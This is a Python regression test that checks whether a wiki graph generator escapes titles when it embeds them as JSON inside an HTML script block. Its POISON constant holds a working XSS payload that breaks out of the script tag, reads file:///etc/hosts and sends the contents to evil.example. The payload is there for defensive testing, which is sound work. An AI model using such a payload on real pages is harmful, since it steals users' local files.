#!/usr/bin/env python3
"""
Regression test for M-6: XSS in tools/graph_generator.py.

The previous version substituted user-derived wiki titles into an HTML
template with plain `json.dumps`, which does not escape `</script>`. A
crafted title could break out of the <script> block and run JS against a
`file://` page that has access to neighbouring local files.

The fix inlines data into a `<script type="application/json">` block and
escapes `<`, `>`, `&` as \\uXXXX. Verify that a poisoned title:
  - never produces a literal `</script>` in the rendered HTML
  - never produces an un-escaped `<` or `>` inside the JSON block
  - round-trips through JSON.parse to the original string
"""
from __future__ import annotations
import json
import re
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))

from graph_generator import generate_html, _json_for_html  # noqa: E402


results = {"pass": 0, "fail": 0}


def _ok(label: str) -> None:
    results["pass"] += 1
    print(f"  ✓ {label}")


def _bad(label: str) -> None:
    results["fail"] += 1
    print(f"  ✗ {label}")


POISON = (
    "</script><img src=x onerror="
    "fetch('file:///etc/hosts').then(r=>r.text()).then(t=>fetch('https://evil.example/?'+t))"
    ">"
)


def main() -> int:
    nodes = [
        {"id": "a", "label": POISON, "path": "wiki/a.md", "group": "entities"},
        {"id": "b", "label": "normal", "path": "wiki/b.md", "group": "concepts"},
    ]
    edges = [{"source": "a", "target": "b"}]
    html = generate_html(nodes, edges)

    # 1. No literal </script> anywhere before the legitimate closing tag.
    # Find the data block and verify it contains no </script>.
    m = re.search(
        r'<script id="pith-graph-data" type="application/json">(.*?)</script>',
        html, re.DOTALL,
    )
    if not m:
        _bad("data block not found in rendered HTML")
        return 1
    body = m.group(1)

    # Any literal `<` in the data block would be parsed by the HTML lexer.
    # After escaping, every `<` must be emitted as the literal two-char
    # sequence `\u003c` (i.e. backslash + u003c), never as `&lt;` or `<`.
    if "<" in body or ">" in body:
        _bad(f"rendered data block contains raw < or > — XSS possible. body[:200]={body[:200]!r}")
    else:
        _ok("rendered data block has no raw < or > (all escaped)")

    # Specifically ensure nothing that looks like an HTML tag slipped through.
    if re.search(r"<\s*/?\s*(script|img|iframe|svg)\b", body, re.IGNORECASE):
        _bad("rendered data block contains a literal HTML tag")
    else:
        _ok("rendered data block contains no literal HTML tag")

    # 2. The escaped payload must still parse as JSON (i.e. JSON.parse works
    # on the page) and round-trip to the original poisoned string.
    # The browser's JSON.parse will decode \u003c back to `<`.
    parsed = json.loads(body)
    got_label = parsed["nodes"][0]["label"]
    if got_label == POISON:
        _ok("JSON.parse round-trip preserves the literal title")
    else:
        _bad(f"round-trip mismatch: got {got_label!r}")

    # 3. Spot-check _json_for_html directly.
    encoded = _json_for_html({"x": "</script>"})
    if "</script>" in encoded:
        _bad("_json_for_html let </script> through")
    else:
        _ok("_json_for_html encodes </script> safely")

    if "\\u003c" not in encoded:
        _bad("_json_for_html did not emit \\u003c")
    else:
        _ok("_json_for_html emits \\u003c for <")

    # 4. An ampersand-based injection (for HTML-entity contexts).
    encoded2 = _json_for_html({"x": "a&b>c"})
    if "&" in encoded2 or ">" in encoded2:
        _bad("_json_for_html let & or > through")
    else:
        _ok("_json_for_html escapes & and >")

    print()
    print(f"── Results ── passed: {results['pass']}  failed: {results['fail']}")
    return 0 if results["fail"] == 0 else 1


if __name__ == "__main__":
    raise SystemExit(main())
